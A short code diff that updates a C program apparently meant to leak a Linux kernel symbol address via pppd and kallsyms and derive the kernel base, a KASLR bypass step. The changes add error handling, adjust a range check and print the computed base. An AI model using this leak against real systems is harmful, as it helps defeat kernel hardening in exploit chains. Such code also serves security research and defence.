@@ -32,9 +32,11 @@ unsigned long get_kernel_addr_pppd_kallsyms() {
     return 0;
   }
 
-  fgets(buf, sizeof(buf) - 1, f);
-  if (ferror(f))
+  if (fgets(buf, sizeof(buf) - 1, f) == NULL) {
     printf("[-] fgets(%s): %m\n", cmd);
+    pclose(f);
+    return 0;
+  }
 
   pclose(f);
 
@@ -52,7 +54,7 @@ unsigned long get_kernel_addr_pppd_kallsyms() {
   char *endptr = &addr_buf[addr_len];
   addr = strtoul(&addr_buf[1], &endptr, 16);
 
-  if (addr > KERNEL_BASE_MIN && addr < KERNEL_BASE_MAX)
+  if (addr >= KERNEL_BASE_MIN && addr <= KERNEL_BASE_MAX)
     return addr;
 
   return 0;
@@ -64,6 +66,7 @@ int main(int argc, char **argv) {
     return 1;
 
   printf("leaked kernel symbol: %lx\n", addr);
+  printf("possible kernel base: %lx\n", addr &~ KERNEL_BASE_MASK);
 
   return 0;
 }
